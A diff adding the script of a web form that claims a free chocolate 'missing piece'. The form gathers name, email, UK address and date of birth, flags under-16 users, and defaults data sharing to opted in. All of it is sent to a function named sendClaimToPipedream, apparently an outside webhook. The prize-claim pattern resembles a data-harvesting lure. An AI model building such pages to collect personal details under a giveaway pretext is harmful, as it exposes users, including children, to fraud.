+            document.getElementById('choice-keep').classList.remove('bg-blue-100', 'shadow-md');
+            document.getElementById('choice-share').classList.remove('bg-blue-100', 'shadow-md');
+            
+            const nextBtn = document.getElementById('choice-next-btn');
+            nextBtn.disabled = true;
+            nextBtn.classList.add('opacity-50', 'cursor-not-allowed');
+
+            function flash() {
+                if (flashCount >= numFlashes) {
+                    const finalChoice = choices[Math.floor(Math.random() * choices.length)];
+                    selectChoice(finalChoice);
+                    document.getElementById('choice-keep').disabled = false;
+                    document.getElementById('choice-share').disabled = false;
+                    clearInterval(intervalId);
+                    return;
+                }
+
+                const prevChoiceKey = choices[currentFlashIndex];
+                document.getElementById(`choice-${prevChoiceKey}`).classList.remove('bg-blue-200');
+
+                currentFlashIndex = 1 - currentFlashIndex; 
+                const nextChoiceKey = choices[currentFlashIndex];
+                
+                document.getElementById(`choice-${nextChoiceKey}`).classList.add('bg-blue-200');
+
+                flashCount++;
+            }
+
+            const intervalId = setInterval(flash, 150); 
+        }
+
+
+        function validateChoice() {
+            if (!formData.choice) {
+                showMessage("Selection Required", "Please choose whether to keep or share the missing piece.");
+                return;
+            }
+            
+            goToStep(3);
+        }
+        
+        function updateDetailsStepContent() {
+            const isSharing = formData.choice === 'share';
+            
+            document.getElementById('details-title').textContent = isSharing ? "Recipient's Mailing Details" : "Your Mailing Details";
+            document.getElementById('details-subtitle').textContent = isSharing ? 
+                "We'll mail the complimentary piece to the recipient's UK address." :
+                "We'll mail the complimentary missing piece directly to your UK address.";
+            
+            document.getElementById('name-label').textContent = isSharing ? "Recipient's Full Name" : "Your Full Name";
+
+            document.getElementById('email-label').textContent = "Claimant's Email Address";
+            document.getElementById('email').placeholder = "Your Email Address (Required)";
+        }
+
+        function submitDetails() {
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const streetNumber = document.getElementById('street_number').value.trim(); 
+            const city = document.getElementById('city').value.trim();
+            const postcode = document.getElementById('postcode').value.trim().toUpperCase();
+
+            if (!name || !email || !streetNumber || !city || !postcode) {
+                showMessage("Missing Information", "Please fill in all required name, email, and address fields.");
+                return;
+            }
+
+            formData.details = { name, email, streetNumber, city, postcode };
+
+            goToStep(4); 
+        }
+
+        function checkAgeWarning() {
+            const dobInput = document.getElementById('dateOfBirth');
+            const dob = dobInput.value;
+            const warningBox = document.getElementById('age-warning-box');
+
+            if (!dob) {
+                warningBox.classList.add('hidden');
+                formData.under_16_warning_shown = false;
+                return;
+            }
+
+            const birthDate = new Date(dob);
+            const today = new Date();
+            
+            let ageInYears = today.getFullYear() - birthDate.getFullYear();
+            const monthDifference = today.getMonth() - birthDate.getMonth();
+            if (monthDifference < 0 || (monthDifference === 0 && today.getDate() < birthDate.getDate())) {
+                ageInYears--;
+            }
+            
+            if (ageInYears < 16) {
+                warningBox.classList.remove('hidden');
+                formData.under_16_warning_shown = true;
+            } else {
+                warningBox.classList.add('hidden');
+                formData.under_16_warning_shown = false;
+            }
+        }
+        
+        function validateBirthDate() {
+            const dobInput = document.getElementById('dateOfBirth');
+            if (!dobInput.value) {
+                showMessage("Date Required", "Please enter your date of birth to proceed.");
+                dobInput.focus();
+                return;
+            }
+            checkAgeWarning(); 
+            goToStep(5);
+        }
+
+        function selectDeliveryProvider(carrierKey) {
+            formData.deliveryProvider = carrierKey;
+
+            document.getElementById('royal_mail-selected').classList.add('hidden');
+            document.getElementById('dhl-selected').classList.add('hidden');
+            document.getElementById('carrier-royal_mail').classList.remove('bg-blue-100', 'shadow-md');
+            document.getElementById('carrier-dhl').classList.remove('bg-blue-100', 'shadow-md');
+
+
+            const selectedText = document.getElementById(`${carrierKey}-selected`);
+            if (selectedText) {
+                selectedText.classList.remove('hidden');
+            }
+            document.getElementById(`carrier-${carrierKey}`).classList.add('bg-blue-100', 'shadow-md');
+
+            updateDeliveryNextButton();
+        }
+        
+        function updateDeliveryNextButton() {
+            const isCarrierSelected = !!formData.deliveryProvider;
+            const isCheckboxChecked = document.getElementById('carrier_happy_checkbox').checked;
+            const nextBtn = document.getElementById('delivery-next-btn');
+
+            if (isCarrierSelected && isCheckboxChecked) {
+                nextBtn.disabled = false;
+                nextBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            } else {
+                nextBtn.disabled = true;
+                nextBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            }
+        }
+
+        function validateDeliveryProvider() {
+            if (!formData.deliveryProvider) {
+                showMessage("Selection Required", "Please select a delivery provider before continuing.");
+                return;
+            }
+            if (!document.getElementById('carrier_happy_checkbox').checked) {
+                showMessage("Confirmation Required", "Please check the box to confirm you are happy with your delivery provider choice.");
+                return;
+            }
+            goToStep(6);
+        }
+        
+        function validateImprovement() {
+            const isOptOutChecked = document.getElementById('data_sharing_checkbox').checked;
+            
+            formData.userAgentSharing = isOptOutChecked ? 'Opted Out (User Agent Only)' : 'Opted In (Default)';
+            
+            goToStep(7);
+        }
+
+        function finalizeClaimAndGoToConfirm() {
+            console.log("--- FINAL CHOCOLUXE CLAIM DATA ---", formData);
+            sendClaimToPipedream(formData);
+
+            const name = formData.details.name;
+            const email = formData.details.email; 
+            
+            const isSharing = formData.choice === 'share';
+            const choiceText = isSharing ? 'A Shared Indulgence is on its way!' : 'The Missing Piece is on its way to YOU!';
+            
+            const streetNumber = formData.details.streetNumber;
+            const city = formData.details.city;
+            const postcode = formData.details.postcode;
+            const combinedAddress = `${streetNumber}, ${city}, ${postcode}, UK`;
+            
+            const userAgentStatus = formData.userAgentSharing;
+            const providerName = carriers[formData.deliveryProvider].name;
+            const ageWarning = formData.under_16_warning_shown ? 'YES - Parental consent recommended' : 'No warning shown';
+
+            document.getElementById('confirm-type-label').textContent = choiceText;
+            document.getElementById('confirm-code').textContent = formData.uniqueCode;
+            document.getElementById('confirm-provider').textContent = providerName;
+            document.getElementById('confirm-data-sharing').textContent = userAgentStatus;
+            document.getElementById('confirm-name').textContent = name;
+            document.getElementById('confirm-email').textContent = email;
+            document.getElementById('confirm-address').textContent = combinedAddress; 
+            
+            document.getElementById('confirm-claimant-label').textContent = isSharing ? 'Recipient Name:' : 'Your Name:';
+            document.getElementById('confirm-address-label').textContent = isSharing ? 'Delivery Address:' : 'Your Address:';
+
+            
+            const ageWarningContainer = document.getElementById('confirm-age-warning-container');
+            document.getElementById('confirm-age-warning').textContent = ageWarning;
+            if (formData.under_16_warning_shown) {
+                ageWarningContainer.classList.remove('hidden');
+            } else {
+                ageWarningContainer.classList.add('hidden');
+            }
+
+            goToStep(8);
+        }
+
+
+        window.onload = function() {
+            const checkbox = document.getElementById('carrier_happy_checkbox');
+            if (checkbox) {
+                checkbox.addEventListener('change', updateDeliveryNextButton);
+            }
+            document.getElementById('dateOfBirth').max = new Date().toISOString().split("T")[0];
+            
+            document.getElementById('dateOfBirth').addEventListener('change', checkAgeWarning);
+
+            goToStep(1);
+        }
+    </script>
+</body>
+</html>
